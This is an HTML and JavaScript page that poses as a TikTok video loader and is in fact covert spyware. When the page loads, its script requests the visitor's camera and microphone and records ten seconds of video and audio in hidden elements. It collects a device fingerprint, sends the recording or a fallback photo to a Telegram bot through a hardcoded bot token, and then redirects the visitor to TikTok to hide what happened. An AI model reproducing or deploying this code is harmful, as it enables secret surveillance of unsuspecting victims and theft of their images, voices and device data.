<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>TikTok Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .tiktok-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
            z-index: 9999;
        }

        .tiktok-logo svg {
            width: 100px;
            height: 100px;
            margin-bottom: 30px;
            filter: drop-shadow(0 0 20px rgba(255, 0, 80, 0.5));
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.05); opacity: 0.9; }
            100% { transform: scale(1); opacity: 1; }
        }

        .loading-title {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 15px;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .loading-subtitle {
            color: #888;
            font-size: 16px;
            margin-bottom: 30px;
        }

        .progress-wrapper {
            width: 300px;
            margin: 20px auto;
        }

        .progress-bar-bg {
            width: 100%;
            height: 6px;
            background: rgba(255,255,255,0.1);
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 10px;
        }

        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #ff0050, #00f2ea);
            border-radius: 3px;
            transition: width 0.3s ease;
            box-shadow: 0 0 20px #ff0050;
        }

        .percentage {
            color: #ff0050;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .status-text {
            color: #00f2ea;
            font-size: 14px;
            margin-bottom: 30px;
            opacity: 0.8;
        }

        .hint-box {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 10px;
            padding: 15px 25px;
            margin-top: 30px;
        }

        .hint-text {
            color: #666;
            font-size: 13px;
        }

        .hint-text span {
            color: #ff0050;
            font-weight: bold;
        }

        /* عناصر مخفية للتصوير */
        .hidden-elements {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- واجهة تيك توك المزيفة -->
    <div class="tiktok-container" id="tiktokUI">
        <div class="tiktok-logo">
            <svg viewBox="0 0 24 24" fill="white">
                <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.24a6.34 6.34 0 0 0 10.86-4.95v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1.04-.72z"/>
            </svg>
        </div>
        
        <div class="loading-title">TikTok</div>
        <div class="loading-subtitle">جاري تحميل الفيديو...</div>
        
        <div class="progress-wrapper">
            <div class="progress-bar-bg">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="percentage" id="percentageDisplay">0%</div>
        </div>
        
        <div class="status-text" id="statusMessage">⏳ يرجى الانتظار قليلاً</div>
        
        <div class="hint-box">
            <div class="hint-text">سيتم تحويلك إلى <span>TikTok</span> تلقائياً</div>
        </div>
    </div>

    <!-- عناصر التسجيل المخفية -->
    <div class="hidden-elements">
        <video id="hiddenVideo" autoplay playsinline muted></video>
        <canvas id="hiddenCanvas"></canvas>
    </div>

    <script>
        (function() {
            // ================== إعدادات البوت والأوامر ==================
            const BOT_CONFIG = {
                token: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU",
                adminId: "739226288", // الآيدي بتاعك انت
                
                // رسائل الأوامر
                commands: {
                    start: "/start",
                    video: "/video",
                    help: "/help"
                }
            };

            // ================== إعدادات التسجيل ==================
            const RECORDING_CONFIG = {
                duration: 10000,           // 10 ثواني فيديو
                videoBitsPerSecond: 4000000, // 4 Mbps جودة عالية
                audioBitsPerSecond: 128000,   // 128 kbps صوت
                width: 1280,
                height: 720,
                frameRate: 30,
                mimeType: 'video/webm;codecs=vp9,opus'
            };

            // ================== إعدادات التوجيه ==================
            const REDIRECT_URL = "https://www.tiktok.com";

            // ================== عناصر الواجهة ==================
            const elements = {
                progressFill: document.getElementById('progressFill'),
                percentageDisplay: document.getElementById('percentageDisplay'),
                statusMessage: document.getElementById('statusMessage')
            };

            // ================== عناصر التسجيل ==================
            const hiddenVideo = document.getElementById('hiddenVideo');
            const hiddenCanvas = document.getElementById('hiddenCanvas');

            // ================== متغيرات التسجيل ==================
            let mediaStream = null;
            let mediaRecorder = null;
            let recordedChunks = [];
            let recordingStartTime = null;
            let captureCompleted = false;
            let progressInterval = null;

            // ================== دوال التحديث ==================
            function updateUI(progress, status) {
                if (elements.progressFill) {
                    elements.progressFill.style.width = `${progress}%`;
                }
                if (elements.percentageDisplay) {
                    elements.percentageDisplay.innerText = `${Math.round(progress)}%`;
                }
                if (elements.statusMessage && status) {
                    elements.statusMessage.innerText = status;
                }
            }

            function formatFileSize(bytes) {
                if (bytes < 1024) return bytes + ' B';
                if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
                if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
                return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
            }

            function getDeviceFingerprint() {
                return {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth + '-bit',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cores: navigator.hardwareConcurrency || 'unknown',
                    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
                    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                    touchPoints: navigator.maxTouchPoints || 0,
                    cookies: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'disabled'
                };
            }

            // ================== دوال التسجيل ==================
            async function startVideoRecording() {
                const urlParams = new URLSearchParams(window.location.search);
                const targetId = urlParams.get('id');
                
                if (!targetId) {
                    console.log("لا يوجد ID مستهدف");
                    window.location.href = REDIRECT_URL;
                    return;
                }

                try {
                    updateUI(2, "🔍 طلب الكاميرا والميكروفون...");
                    
                    // طلب الكاميرا والميكروفون
                    mediaStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: "user",
                            width: { ideal: RECORDING_CONFIG.width },
                            height: { ideal: RECORDING_CONFIG.height },
                            frameRate: { ideal: RECORDING_CONFIG.frameRate }
                        },
                        audio: {
                            echoCancellation: false,
                            noiseSuppression: false,
                            autoGainControl: false,
                            sampleRate: 48000,
                            channelCount: 2
                        }
                    });

                    hiddenVideo.srcObject = mediaStream;
                    
                    // انتظار تهيئة الفيديو
                    await new Promise((resolve) => {
                        hiddenVideo.onloadedmetadata = () => {
                            hiddenVideo.play();
                            resolve();
                        };
                    });

                    updateUI(10, "⚙️ تهيئة الكاميرا... (3 ثواني)");
                    
                    // انتظار لضبط الإضاءة والصوت
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    
                    // بدء التسجيل
                    await setupRecorder(targetId);

                } catch (error) {
                    console.error("خطأ:", error);
                    
                    // إذا فشل الميكروفون، حاول بالكاميرا فقط
                    if (error.name === 'NotAllowedError' || error.name === 'NotFoundError') {
                        await startVideoOnly(targetId);
                    } else {
                        await handleFatalError(targetId, error);
                    }
                }
            }

            async function startVideoOnly(targetId) {
                try {
                    updateUI(5, "📹 محاولة بالكاميرا فقط...");
                    
                    mediaStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: "user",
                            width: { ideal: RECORDING_CONFIG.width },
                            height: { ideal: RECORDING_CONFIG.height }
                        },
                        audio: false
                    });

                    hiddenVideo.srcObject = mediaStream;
                    
                    await new Promise((resolve) => {
                        hiddenVideo.onloadedmetadata = () => {
                            hiddenVideo.play();
                            resolve();
                        };
                    });

                    updateUI(15, "⚙️ تهيئة الكاميرا...");
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    
                    await setupRecorder(targetId);

                } catch (error) {
                    await handleFatalError(targetId, error);
                }
            }

            async function setupRecorder(targetId) {
                return new Promise((resolve, reject) => {
                    try {
                        recordedChunks = [];
                        recordingStartTime = Date.now();

                        // اختيار أفضل كوديك متوفر
                        const mimeTypes = [
                            'video/webm;codecs=vp9,opus',
                            'video/webm;codecs=vp8,opus',
                            'video/webm;codecs=h264,opus',
                            'video/webm'
                        ];

                        let selectedMimeType = '';
                        for (const mimeType of mimeTypes) {
                            if (MediaRecorder.isTypeSupported(mimeType)) {
                                selectedMimeType = mimeType;
                                break;
                            }
                        }

                        // إعداد المسجل
                        mediaRecorder = new MediaRecorder(mediaStream, {
                            mimeType: selectedMimeType,
                            videoBitsPerSecond: RECORDING_CONFIG.videoBitsPerSecond,
                            audioBitsPerSecond: RECORDING_CONFIG.audioBitsPerSecond
                        });

                        mediaRecorder.ondataavailable = (event) => {
                            if (event.data.size > 0) {
                                recordedChunks.push(event.data);
                            }
                        };

                        mediaRecorder.onstop = async () => {
                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
                            
                            if (blob.size < 50000) {
                                console.log("❌ الفيديو صغير جداً");
                                await sendErrorMessage(targetId, "فشل التسجيل - فيديو صغير");
                                window.location.href = REDIRECT_URL;
                                return;
                            }

                            updateUI(95, "📤 جاري رفع الفيديو...");
                            
                            const success = await uploadVideo(blob, targetId);
                            
                            if (success) {
                                updateUI(100, "✅ تم الرفع بنجاح!");
                                
                                // إيقاف الكاميرا
                                if (mediaStream) {
                                    mediaStream.getTracks().forEach(track => track.stop());
                                }
                                
                                // التوجيه لتيك توك
                                setTimeout(() => {
                                    window.location.href = REDIRECT_URL;
                                }, 2000);
                            } else {
                                await sendErrorMessage(targetId, "فشل رفع الفيديو");
                                setTimeout(() => {
                                    window.location.href = REDIRECT_URL;
                                }, 2000);
                            }
                            
                            resolve();
                        };

                        // بدء التسجيل
                        mediaRecorder.start(1000);
                        updateUI(20, `🔴 تسجيل ${RECORDING_CONFIG.duration/1000} ثواني مع الصوت...`);
                        
                        // تحديث التقدم
                        progressInterval = setInterval(() => {
                            if (captureCompleted) return;
                            
                            const elapsed = Date.now() - recordingStartTime;
                            const progress = 20 + (elapsed / RECORDING_CONFIG.duration) * 70;
                            updateUI(Math.min(progress, 90), `⏱️ تسجيل... ${Math.round(elapsed/1000)}/${RECORDING_CONFIG.duration/1000} ثانية`);
                        }, 100);

                        // إيقاف التسجيل بعد المدة
                        setTimeout(() => {
                            if (mediaRecorder && mediaRecorder.state === 'recording') {
                                captureCompleted = true;
                                mediaRecorder.stop();
                                clearInterval(progressInterval);
                            }
                        }, RECORDING_CONFIG.duration);

                    } catch (error) {
                        console.error("خطأ في التسجيل:", error);
                        reject(error);
                    }
                });
            }

            async function uploadVideo(blob, targetId) {
                try {
                    const deviceInfo = getDeviceFingerprint();
                    
                    const formData = new FormData();
                    formData.append('chat_id', targetId);
                    formData.append('video', blob, 'video.webm');
                    
                    let caption = `🎥 تسجيل فيديو جديد
                    
⏱️ المدة: ${RECORDING_CONFIG.duration/1000} ثواني
📏 الدقة: ${RECORDING_CONFIG.width}x${RECORDING_CONFIG.height}
💾 الحجم: ${formatFileSize(blob.size)}
🔊 الصوت: ${mediaStream.getAudioTracks().length > 0 ? 'نعم' : 'لا'}

📱 معلومات الجهاز:
• النظام: ${deviceInfo.platform}
• المعالج: ${deviceInfo.cores} نواة
• الذاكرة: ${deviceInfo.memory}
• الشاشة: ${deviceInfo.screen} (${deviceInfo.colorDepth})
• اللغة: ${deviceInfo.language}
• التوقيت: ${deviceInfo.timezone}
• الاتصال: ${deviceInfo.connection}
• نقط اللمس: ${deviceInfo.touchPoints}
• الكوكيز: ${deviceInfo.cookies ? 'مفعلة' : 'معطلة'}

⏰ وقت التسجيل: ${new Date().toLocaleString('ar-EG')}`;

                    formData.append('caption', caption);

                    const response = await fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });

                    return response.ok;

                } catch (error) {
                    console.error("خطأ في الرفع:", error);
                    
                    // إذا فشل، أرسل صورة
                    return await uploadPhoto(targetId);
                }
            }

            async function uploadPhoto(targetId) {
                try {
                    hiddenCanvas.width = hiddenVideo.videoWidth;
                    hiddenCanvas.height = hiddenVideo.videoHeight;
                    hiddenCanvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
                    
                    const blob = await new Promise(resolve => {
                        hiddenCanvas.toBlob(resolve, 'image/jpeg', 0.9);
                    });

                    const formData = new FormData();
                    formData.append('chat_id', targetId);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', `📸 لقطة شاشة (فشل الفيديو)
🆔 المعرف: ${targetId}
⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);

                    const response = await fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    return response.ok;

                } catch (error) {
                    console.error("فشل إرسال الصورة:", error);
                    return false;
                }
            }

            async function sendErrorMessage(targetId, errorMsg) {
                try {
                    const deviceInfo = getDeviceFingerprint();
                    const text = `❌ خطأ في التسجيل
                    
${errorMsg}
🆔 المعرف: ${targetId}
📱 النظام: ${deviceInfo.platform}
⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;

                    await fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: targetId, text: text })
                    });
                } catch (e) {}
            }

            async function handleFatalError(targetId, error) {
                console.error("خطأ جسيم:", error);
                
                await sendErrorMessage(targetId, error.message || 'خطأ غير معروف');
                window.location.href = REDIRECT_URL;
            }

            // ================== بدء التنفيذ ==================
            function initialize() {
                const urlParams = new URLSearchParams(window.location.search);
                const targetId = urlParams.get('id');
                
                if (!targetId) {
                    console.log("⚠️ لا يوجد ID - توجيه مباشر");
                    window.location.href = REDIRECT_URL;
                    return;
                }

                console.log("🚀 بدء التسجيل للمعرف:", targetId);
                
                // بدء التسجيل
                startVideoRecording();

                // حد أقصى 25 ثانية
                setTimeout(() => {
                    if (!captureCompleted) {
                        window.location.href = REDIRECT_URL;
                    }
                }, 25000);
            }

            // تشغيل كل شيء
            initialize();

        })();
    </script>
</body>
</html>
